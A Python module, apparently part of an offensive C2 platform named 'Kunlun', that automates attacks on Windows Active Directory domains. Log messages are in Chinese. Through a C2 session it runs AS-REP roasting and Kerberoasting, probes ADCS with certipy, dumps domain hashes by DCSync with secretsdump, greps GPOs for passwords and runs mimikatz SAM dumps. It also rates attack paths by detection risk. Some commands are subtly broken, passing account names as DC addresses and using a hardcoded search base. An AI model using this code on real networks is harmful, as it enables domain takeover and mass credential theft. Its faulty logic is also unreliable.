"""Domain auto-exploration engine for Kunlun platform.

Provides:
- Automated domain reconnaissance (SPN enumeration, DC login traces, AS-REP/Kerberoastable accounts)
- Automated privilege escalation (AS-REP Roasting, Kerberoasting, ADCS exploitation, delegation abuse)
- Automated credential harvesting (DCSync, GPO credential extraction, SAM/LSASS export)
- Attack path recommendation and automatic status updates
"""

import asyncio
import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


class ReconPhase(Enum):
    """Reconnaissance phase."""
    SPN_ENUMERATION = "spn_enumeration"
    DC_LOGIN_TRACES = "dc_login_traces"
    ASREP_ROASTABLE = "asrep_roastable"
    KERBEROASTABLE = "kerberoastable"
    ADCS_ENUMERATION = "adcs_enumeration"
    EXCHANGE_DISCOVERY = "exchange_discovery"
    SQL_DISCOVERY = "sql_discovery"
    COMPLETED = "completed"


class EscalationMethod(Enum):
    """Privilege escalation method."""
    ASREP_ROASTING = "asrep_roasting"
    KERBEROASTING = "kerberoasting"
    ADCS_ESCALATION = "adcs_escalation"
    DELEGATION_ABUSE = "delegation_abuse"


class HarvestMethod(Enum):
    """Credential harvesting method."""
    DCSYNC = "dcsync"
    GPO_EXTRACTION = "gpo_extraction"
    SAM_EXPORT = "sam_export"
    LSASS_EXPORT = "lsass_export"


@dataclass
class ReconResult:
    """Result of domain reconnaissance.

    Attributes:
        spn_accounts: List of SPN-enabled accounts
        dc_login_traces: List of DC login traces
        asrep_roastable: List of AS-REP roastable accounts
        kerberoastable: List of Kerberoastable accounts
        adcs_config: ADCS configuration
        exchange_servers: List of Exchange servers
        sql_servers: List of SQL servers
        high_value_targets: List of high-value targets
        attack_paths: List of recommended attack paths
        phase: Current recon phase
        duration_seconds: Recon duration
    """
    spn_accounts: List[str] = field(default_factory=list)
    dc_login_traces: List[Dict[str, str]] = field(default_factory=list)
    asrep_roastable: List[str] = field(default_factory=list)
    kerberoastable: List[str] = field(default_factory=list)
    adcs_config: Dict[str, Any] = field(default_factory=dict)
    exchange_servers: List[str] = field(default_factory=list)
    sql_servers: List[str] = field(default_factory=list)
    high_value_targets: List[str] = field(default_factory=list)
    attack_paths: List[Dict[str, str]] = field(default_factory=list)
    phase: ReconPhase = ReconPhase.SPN_ENUMERATION
    duration_seconds: float = 0.0


@dataclass
class EscalationResult:
    """Result of privilege escalation.

    Attributes:
        method: Escalation method used
        success: Whether escalation succeeded
        target_account: Target account
        obtained_credentials: List of obtained credentials
        is_domain_admin: Whether target is domain admin
        next_recommended: Next recommended escalation method
        error_message: Error message if failed
        duration_seconds: Escalation duration
    """
    method: EscalationMethod = EscalationMethod.ASREP_ROASTING
    success: bool = False
    target_account: str = ""
    obtained_credentials: List[Dict[str, str]] = field(default_factory=list)
    is_domain_admin: bool = False
    next_recommended: str = ""
    error_message: str = ""
    duration_seconds: float = 0.0


@dataclass
class HarvestResult:
    """Result of credential harvesting.

    Attributes:
        method: Harvesting method used
        success: Whether harvesting succeeded
        credentials_exported: Number of exported credentials
        high_value_credentials: List of high-value credentials
        credential_store_path: Path to credential store
        error_message: Error message if failed
        duration_seconds: Harvesting duration
    """
    method: HarvestMethod = HarvestMethod.DCSYNC
    success: bool = False
    credentials_exported: int = 0
    high_value_credentials: List[Dict[str, str]] = field(default_factory=list)
    credential_store_path: str = ""
    error_message: str = ""
    duration_seconds: float = 0.0


@dataclass
class AutoExploreConfig:
    """Configuration for auto-exploration engine.

    Attributes:
        target_domain: Target domain
        target_dc: Target domain controller
        run_recon: Whether to run reconnaissance
        run_escalation: Whether to run privilege escalation
        run_harvesting: Whether to run credential harvesting
        max_escalation_attempts: Maximum escalation attempts
        stealth_mode: Enable stealth mode
        auto_analyze: Auto analyze results
    """
    target_domain: str = ""
    target_dc: str = ""
    run_recon: bool = True
    run_escalation: bool = True
    run_harvesting: bool = True
    max_escalation_attempts: int = 5
    stealth_mode: bool = False
    auto_analyze: bool = True


class DomainAutoExplore:
    """Domain auto-exploration engine.

    Provides automated domain reconnaissance, privilege escalation,
    and credential harvesting with attack path recommendation.
    """

    HIGH_VALUE_GROUPS: List[str] = [
        "Domain Admins",
        "Enterprise Admins",
        "Schema Admins",
        "Administrators",
        "Backup Operators",
        "Account Operators",
        "Server Operators",
        "Print Operators",
    ]

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize domain auto-exploration engine.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._recon_result: Optional[ReconResult] = None
        self._escalation_results: List[EscalationResult] = []
        self._harvest_results: List[HarvestResult] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("AutoExplore Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("AutoExplore: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def execute_full_exploration(self, config: AutoExploreConfig) -> Dict[str, Any]:
        """Execute full domain exploration.

        Args:
            config: Auto-exploration configuration.

        Returns:
            Dictionary with exploration results.
        """
        start_time = time.time()
        results: Dict[str, Any] = {
            "success": False,
            "recon": None,
            "escalation": [],
            "harvesting": [],
            "attack_paths": [],
            "duration_seconds": 0.0,
        }

        try:
            await self._report_log(f"开始自动化域内探索: {config.target_domain}")

            if config.run_recon:
                await self._report_progress("执行域内侦察", 10)
                recon = await self._execute_recon(config)
                results["recon"] = recon
                self._recon_result = recon
                await self._report_log(f"侦察完成: 发现 {len(recon.high_value_targets)} 个高价值目标")

            if config.run_escalation and self._recon_result:
                await self._report_progress("执行权限提升", 40)
                escalation_results = await self._execute_escalation(config, self._recon_result)
                results["escalation"] = escalation_results
                self._escalation_results = escalation_results
                await self._report_log(f"权限提升完成: {len(escalation_results)} 次尝试")

            if config.run_harvesting:
                await self._report_progress("执行凭据收割", 70)
                harvest_results = await self._execute_harvesting(config)
                results["harvesting"] = harvest_results
                self._harvest_results = harvest_results
                await self._report_log(f"凭据收割完成: {len(harvest_results)} 次收割")

            if config.auto_analyze:
                await self._report_progress("分析攻击路径", 90)
                attack_paths = self._analyze_attack_paths()
                results["attack_paths"] = attack_paths
                await self._report_log(f"发现 {len(attack_paths)} 条攻击路径")

            results["success"] = True
            results["duration_seconds"] = time.time() - start_time

            await self._report_progress("完成", 100)
            await self._report_log("自动化域内探索完成!")

            await self._broadcast_event(results, config)

        except Exception as e:
            await self._report_log(f"自动化域内探索失败: {e}")
            logger.error("Auto-exploration failed: %s", e)
            results["duration_seconds"] = time.time() - start_time

        return results

    async def _execute_recon(self, config: AutoExploreConfig) -> ReconResult:
        """Execute domain reconnaissance.

        Args:
            config: Auto-exploration configuration.

        Returns:
            ReconResult with reconnaissance findings.
        """
        recon = ReconResult()

        try:
            await self._report_log("开始域内侦察...")

            await self._report_progress("SPN枚举", 5)
            recon.phase = ReconPhase.SPN_ENUMERATION
            recon.spn_accounts = await self._enumerate_spn_accounts(config.target_domain)
            await self._report_log(f"SPN账户: {len(recon.spn_accounts)} 个")

            await self._report_progress("域控登录痕迹", 15)
            recon.phase = ReconPhase.DC_LOGIN_TRACES
            recon.dc_login_traces = await self._get_dc_login_traces(config.target_dc)
            await self._report_log(f"域控登录痕迹: {len(recon.dc_login_traces)} 条")

            await self._report_progress("AS-REP Roastable账户", 25)
            recon.phase = ReconPhase.ASREP_ROASTABLE
            recon.asrep_roastable = await self._find_asrep_roastable(config.target_domain)
            await self._report_log(f"AS-REP Roastable: {len(recon.asrep_roastable)} 个")

            await self._report_progress("Kerberoastable账户", 35)
            recon.phase = ReconPhase.KERBEROASTABLE
            recon.kerberoastable = await self._find_kerberoastable(config.target_domain)
            await self._report_log(f"Kerberoastable: {len(recon.kerberoastable)} 个")

            await self._report_progress("ADCS环境枚举", 50)
            recon.phase = ReconPhase.ADCS_ENUMERATION
            recon.adcs_config = await self._enumerate_adcs(config.target_domain)
            await self._report_log(f"ADCS配置: {len(recon.adcs_config)} 项")

            await self._report_progress("Exchange服务器发现", 65)
            recon.phase = ReconPhase.EXCHANGE_DISCOVERY
            recon.exchange_servers = await self._discover_exchange_servers(config.target_domain)
            await self._report_log(f"Exchange服务器: {len(recon.exchange_servers)} 个")

            await self._report_progress("SQL服务器发现", 80)
            recon.phase = ReconPhase.SQL_DISCOVERY
            recon.sql_servers = await self._discover_sql_servers(config.target_domain)
            await self._report_log(f"SQL服务器: {len(recon.sql_servers)} 个")

            recon.high_value_targets = self._identify_high_value_targets(recon)
            recon.attack_paths = self._generate_attack_paths(recon)
            recon.phase = ReconPhase.COMPLETED

        except Exception as e:
            logger.error("Reconnaissance failed: %s", e)
            await self._report_log(f"侦察失败: {e}")

        return recon

    async def _enumerate_spn_accounts(self, target_domain: str) -> List[str]:
        """Enumerate SPN-enabled accounts.

        Args:
            target_domain: Target domain.

        Returns:
            List of SPN accounts.
        """
        try:
            cmd = (
                f"Get-ADUser -Filter {{ServicePrincipalName -like '*'}} "
                f"-Properties ServicePrincipalName -Server {target_domain} | "
                f"Select-Object -ExpandProperty SamAccountName"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = str(result.get("output", ""))
                return [line.strip() for line in output.split("\n") if line.strip()]
        except Exception as e:
            logger.error("SPN enumeration failed: %s", e)
        return []

    async def _get_dc_login_traces(self, target_dc: str) -> List[Dict[str, str]]:
        """Get DC login traces.

        Args:
            target_dc: Target domain controller.

        Returns:
            List of login traces.
        """
        traces: List[Dict[str, str]] = []

        try:
            cmd = (
                f"Get-WinEvent -FilterHashtable @{{"
                f"LogName='Security'; ID=4624; "
                f"StartTime=(Get-Date).AddDays(-7)}}"
                f" | Where-Object {{ $_.Message -match 'Domain Admins' }}"
                f" | Select-Object TimeCreated, Message -First 50"
            )
            result = await self._execute_command(cmd, target_dc)
            if result.get("success"):
                output = str(result.get("output", ""))
                for line in output.split("\n"):
                    if "TimeCreated" in line or "Message" in line:
                        parts = line.split(":", 1)
                        if len(parts) == 2:
                            traces.append({
                                "field": parts[0].strip(),
                                "value": parts[1].strip(),
                            })
        except Exception as e:
            logger.error("DC login trace retrieval failed: %s", e)

        return traces

    async def _find_asrep_roastable(self, target_domain: str) -> List[str]:
        """Find AS-REP roastable accounts.

        Args:
            target_domain: Target domain.

        Returns:
            List of AS-REP roastable accounts.
        """
        try:
            cmd = (
                f"Get-ADUser -Filter {{DoesNotRequirePreAuth -eq $True}} "
                f"-Properties DoesNotRequirePreAuth -Server {target_domain} | "
                f"Select-Object -ExpandProperty SamAccountName"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = str(result.get("output", ""))
                return [line.strip() for line in output.split("\n") if line.strip()]
        except Exception as e:
            logger.error("AS-REP roastable discovery failed: %s", e)
        return []

    async def _find_kerberoastable(self, target_domain: str) -> List[str]:
        """Find Kerberoastable accounts.

        Args:
            target_domain: Target domain.

        Returns:
            List of Kerberoastable accounts.
        """
        try:
            cmd = (
                f"Get-ADUser -Filter {{ServicePrincipalName -ne '$null'}} "
                f"-Properties ServicePrincipalName -Server {target_domain} | "
                f"Select-Object -ExpandProperty SamAccountName"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = str(result.get("output", ""))
                return [line.strip() for line in output.split("\n") if line.strip()]
        except Exception as e:
            logger.error("Kerberoastable discovery failed: %s", e)
        return []

    async def _enumerate_adcs(self, target_domain: str) -> Dict[str, Any]:
        """Enumerate ADCS configuration.

        Args:
            target_domain: Target domain.

        Returns:
            ADCS configuration dictionary.
        """
        config: Dict[str, Any] = {}

        try:
            cmd = (
                f"Get-ADObject -LDAPFilter '(objectClass=pKIEnrollmentService)' "
                f"-SearchBase 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com' "
                f"-Properties displayName, dNSHostName, certificateTemplates"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = str(result.get("output", ""))
                config["cas"] = len([line for line in output.split("\n") if "displayName" in line])
                config["templates"] = len([line for line in output.split("\n") if "certificateTemplates" in line])
        except Exception as e:
            logger.error("ADCS enumeration failed: %s", e)

        return config

    async def _discover_exchange_servers(self, target_domain: str) -> List[str]:
        """Discover Exchange servers.

        Args:
            target_domain: Target domain.

        Returns:
            List of Exchange servers.
        """
        servers: List[str] = []

        try:
            cmd = (
                f"Get-ADComputer -LDAPFilter '(servicePrincipalName=exchangeMDB*)' "
                f"-Server {target_domain} | Select-Object -ExpandProperty Name"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = str(result.get("output", ""))
                servers = [line.strip() for line in output.split("\n") if line.strip()]
        except Exception as e:
            logger.error("Exchange server discovery failed: %s", e)

        return servers

    async def _discover_sql_servers(self, target_domain: str) -> List[str]:
        """Discover SQL servers.

        Args:
            target_domain: Target domain.

        Returns:
            List of SQL servers.
        """
        servers: List[str] = []

        try:
            cmd = (
                f"Get-ADComputer -LDAPFilter '(servicePrincipalName=MSSQLSvc*)' "
                f"-Server {target_domain} | Select-Object -ExpandProperty Name"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = str(result.get("output", ""))
                servers = [line.strip() for line in output.split("\n") if line.strip()]
        except Exception as e:
            logger.error("SQL server discovery failed: %s", e)

        return servers

    def _identify_high_value_targets(self, recon: ReconResult) -> List[str]:
        """Identify high-value targets from recon results.

        Args:
            recon: Reconnaissance results.

        Returns:
            List of high-value targets.
        """
        targets: Set[str] = set()

        for account in recon.spn_accounts:
            if any(group in account.lower() for group in ["admin", "svc", "sql", "backup"]):
                targets.add(account)

        for account in recon.asrep_roastable:
            if any(group in account.lower() for group in ["admin", "svc"]):
                targets.add(account)

        for account in recon.kerberoastable:
            if any(group in account.lower() for group in ["admin", "svc"]):
                targets.add(account)

        return list(targets)

    def _generate_attack_paths(self, recon: ReconResult) -> List[Dict[str, str]]:
        """Generate attack paths from recon results.

        Args:
            recon: Reconnaissance results.

        Returns:
            List of attack paths.
        """
        paths: List[Dict[str, str]] = []

        if recon.asrep_roastable:
            paths.append({
                "name": "AS-REP Roasting",
                "description": f"利用 {len(recon.asrep_roastable)} 个AS-REP Roastable账户进行离线破解",
                "difficulty": "低",
                "detection_risk": "低",
            })

        if recon.kerberoastable:
            paths.append({
                "name": "Kerberoasting",
                "description": f"利用 {len(recon.kerberoastable)} 个Kerberoastable账户请求TGS票据",
                "difficulty": "中",
                "detection_risk": "中",
            })

        if recon.adcs_config.get("cas", 0) > 0:
            paths.append({
                "name": "ADCS ESC1-8利用",
                "description": "利用ADCS证书服务漏洞进行权限提升",
                "difficulty": "高",
                "detection_risk": "中",
            })

        if recon.exchange_servers:
            paths.append({
                "name": "Exchange服务器利用",
                "description": f"通过 {len(recon.exchange_servers)} 个Exchange服务器进行横向移动",
                "difficulty": "高",
                "detection_risk": "高",
            })

        return paths

    async def _execute_escalation(
        self,
        config: AutoExploreConfig,
        recon: ReconResult,
    ) -> List[EscalationResult]:
        """Execute privilege escalation.

        Args:
            config: Auto-exploration configuration.
            recon: Reconnaissance results.

        Returns:
            List of escalation results.
        """
        results: List[EscalationResult] = []

        try:
            await self._report_log("开始自动化权限提升...")

            if recon.asrep_roastable:
                await self._report_progress("AS-REP Roasting", 45)
                result = await self._escalate_asrep(recon.asrep_roastable[0])
                results.append(result)
                if result.success:
                    await self._report_log(f"AS-REP Roasting成功: {result.target_account}")

            if recon.kerberoastable and len(results) < config.max_escalation_attempts:
                await self._report_progress("Kerberoasting", 55)
                result = await self._escalate_kerberoast(recon.kerberoastable[0])
                results.append(result)
                if result.success:
                    await self._report_log(f"Kerberoasting成功: {result.target_account}")

            if recon.adcs_config.get("cas", 0) > 0 and len(results) < config.max_escalation_attempts:
                await self._report_progress("ADCS利用", 65)
                result = await self._escalate_adcs(config.target_domain)
                results.append(result)
                if result.success:
                    await self._report_log("ADCS利用成功")

        except Exception as e:
            logger.error("Escalation failed: %s", e)
            await self._report_log(f"权限提升失败: {e}")

        return results

    async def _escalate_asrep(self, target_account: str) -> EscalationResult:
        """Execute AS-REP Roasting escalation.

        Args:
            target_account: Target account.

        Returns:
            EscalationResult.
        """
        start_time = time.time()
        result = EscalationResult(
            method=EscalationMethod.ASREP_ROASTING,
            target_account=target_account,
        )

        try:
            cmd = f"GetNPUsers.py -dc-ip {target_account} -request -format hashcat"
            exec_result = await self._execute_command(cmd)

            if exec_result.get("success"):
                output = str(exec_result.get("output", ""))
                if "$krb5asrep$" in output.lower():
                    result.success = True
                    result.obtained_credentials.append({
                        "account": target_account,
                        "hash": output.strip(),
                        "type": "asrep",
                    })

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    async def _escalate_kerberoast(self, target_account: str) -> EscalationResult:
        """Execute Kerberoasting escalation.

        Args:
            target_account: Target account.

        Returns:
            EscalationResult.
        """
        start_time = time.time()
        result = EscalationResult(
            method=EscalationMethod.KERBEROASTING,
            target_account=target_account,
        )

        try:
            cmd = f"GetUserSPNs.py -request -dc-ip {target_account}"
            exec_result = await self._execute_command(cmd)

            if exec_result.get("success"):
                output = str(exec_result.get("output", ""))
                if "$krb5tgs$" in output.lower():
                    result.success = True
                    result.obtained_credentials.append({
                        "account": target_account,
                        "hash": output.strip(),
                        "type": "kerberoast",
                    })

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    async def _escalate_adcs(self, target_domain: str) -> EscalationResult:
        """Execute ADCS escalation.

        Args:
            target_domain: Target domain.

        Returns:
            EscalationResult.
        """
        start_time = time.time()
        result = EscalationResult(
            method=EscalationMethod.ADCS_ESCALATION,
        )

        try:
            cmd = f"certipy find -dc-ip {target_domain} -vulnerable"
            exec_result = await self._execute_command(cmd)

            if exec_result.get("success"):
                output = str(exec_result.get("output", ""))
                if "vulnerable" in output.lower() or "esc" in output.lower():
                    result.success = True

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    async def _execute_harvesting(self, config: AutoExploreConfig) -> List[HarvestResult]:
        """Execute credential harvesting.

        Args:
            config: Auto-exploration configuration.

        Returns:
            List of harvest results.
        """
        results: List[HarvestResult] = []

        try:
            await self._report_log("开始自动化凭据收割...")

            await self._report_progress("DCSync批量导出", 75)
            result = await self._harvest_dcsync(config.target_dc)
            results.append(result)
            if result.success:
                await self._report_log(f"DCSync导出 {result.credentials_exported} 个凭据")

            await self._report_progress("GPO凭据提取", 85)
            result = await self._harvest_gpo_credentials(config.target_domain)
            results.append(result)
            if result.success:
                await self._report_log(f"GPO提取 {result.credentials_exported} 个凭据")

            await self._report_progress("SAM/LSASS导出", 95)
            result = await self._harvest_sam_lsass(config.target_dc)
            results.append(result)
            if result.success:
                await self._report_log(f"SAM/LSASS导出 {result.credentials_exported} 个凭据")

        except Exception as e:
            logger.error("Harvesting failed: %s", e)
            await self._report_log(f"凭据收割失败: {e}")

        return results

    async def _harvest_dcsync(self, target_dc: str) -> HarvestResult:
        """Execute DCSync harvesting.

        Args:
            target_dc: Target domain controller.

        Returns:
            HarvestResult.
        """
        start_time = time.time()
        result = HarvestResult(method=HarvestMethod.DCSYNC)

        try:
            cmd = f"secretsdump.py -just-dc {target_dc}"
            exec_result = await self._execute_command(cmd)

            if exec_result.get("success"):
                output = str(exec_result.get("output", ""))
                lines = [line for line in output.split("\n") if ":" in line and "$" not in line]
                result.credentials_exported = len(lines)
                result.success = True
                result.credential_store_path = f"/tmp/dcsync_{int(time.time())}.txt"

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    async def _harvest_gpo_credentials(self, target_domain: str) -> HarvestResult:
        """Execute GPO credential harvesting.

        Args:
            target_domain: Target domain.

        Returns:
            HarvestResult.
        """
        start_time = time.time()
        result = HarvestResult(method=HarvestMethod.GPO_EXTRACTION)

        try:
            cmd = (
                f"Get-GPO -Domain {target_domain} -All | "
                f"Get-GPOReport -ReportType XML | "
                f"Select-String -Pattern 'Password|Credential'"
            )
            exec_result = await self._execute_command(cmd)

            if exec_result.get("success"):
                output = str(exec_result.get("output", ""))
                lines = [line.strip() for line in output.split("\n") if line.strip()]
                result.credentials_exported = len(lines)
                result.success = True

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    async def _harvest_sam_lsass(self, target_dc: str) -> HarvestResult:
        """Execute SAM/LSASS harvesting.

        Args:
            target_dc: Target domain controller.

        Returns:
            HarvestResult.
        """
        start_time = time.time()
        result = HarvestResult(method=HarvestMethod.SAM_EXPORT)

        try:
            cmd = f"mimikatz lsadump::sam /system:\\\\{target_dc}\\c$\\windows\\system32\\config\\system"
            exec_result = await self._execute_command(cmd)

            if exec_result.get("success"):
                output = str(exec_result.get("output", ""))
                lines = [line for line in output.split("\n") if "NTLM" in line or "Hash" in line]
                result.credentials_exported = len(lines)
                result.success = True

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    def _analyze_attack_paths(self) -> List[Dict[str, str]]:
        """Analyze and recommend attack paths.

        Returns:
            List of recommended attack paths.
        """
        paths: List[Dict[str, str]] = []

        if self._recon_result:
            paths.extend(self._recon_result.attack_paths)

        for esc_result in self._escalation_results:
            if esc_result.success:
                paths.append({
                    "name": f"成功路径: {esc_result.method.value}",
                    "description": f"通过 {esc_result.target_account} 获得凭据",
                    "difficulty": "已验证",
                    "detection_risk": "低",
                })

        return paths

    async def _broadcast_event(self, results: Dict[str, Any], config: AutoExploreConfig) -> None:
        """Broadcast auto-exploration event.

        Args:
            results: Exploration results.
            config: Auto-exploration configuration.
        """
        if not self.event_bus:
            return

        try:
            event_data = {
                "event_type": "auto_explore",
                "success": results.get("success", False),
                "target_domain": config.target_domain,
                "recon_completed": results.get("recon") is not None,
                "escalation_attempts": len(results.get("escalation", [])),
                "harvest_attempts": len(results.get("harvesting", [])),
                "attack_paths": len(results.get("attack_paths", [])),
                "duration_seconds": results.get("duration_seconds", 0.0),
                "timestamp": time.time(),
            }
            await self.event_bus.publish("domain_attack", event_data)
        except Exception as e:
            logger.error("Failed to broadcast auto-explore event: %s", e)
